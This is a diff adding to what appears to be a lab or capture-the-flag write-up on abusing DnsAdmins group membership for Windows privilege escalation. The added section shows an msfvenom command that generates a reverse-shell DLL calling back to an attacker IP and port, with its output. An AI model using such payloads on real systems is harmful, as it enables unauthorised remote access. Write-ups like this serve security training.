@@ -281,5 +281,17 @@ Looking at bloodhound i can see that the user is part of the `DnsAdmins` group
 
 https://infosecwriteups.com/dnsadmins-privesc-0df5ef7e2f61
 
+```python
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f dll -o reverse.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: reverse.dll
+```
+Ill generate a payload
 
+```python
+
+```
 
